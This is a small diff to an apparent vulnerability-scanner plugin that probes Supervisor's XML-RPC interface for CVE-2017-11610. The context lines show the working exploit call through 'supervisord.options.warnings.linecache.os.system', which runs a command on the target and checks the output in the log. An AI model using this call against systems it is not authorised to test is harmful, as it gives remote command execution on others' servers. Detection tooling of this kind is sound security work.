@@ -15,7 +15,7 @@ def do_check(self, url):
         domain = arg + ':9001'
     else:
         domain = arg
-    target = 'http://' + domain +'/RPC2'
+    target = 'http://' + domain + '/RPC2'
     try:
         proxy = xmlrpclib.ServerProxy(target)
         old = getattr(proxy, 'supervisor.readLog')(0,0)
@@ -26,6 +26,6 @@ def do_check(self, url):
         getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
         result = getattr(proxy, 'supervisor.readLog')(0,0)
         if result[len(old):].strip() == str(a+b):
-            save_user_script_result(self, '', arg, 'CVE-2017-11610 Supervisor Remote Command Execution')
+            save_user_script_result(self, '', arg, '', 'CVE-2017-11610 Supervisor Remote Command Execution')
     except Exception as e:
         pass
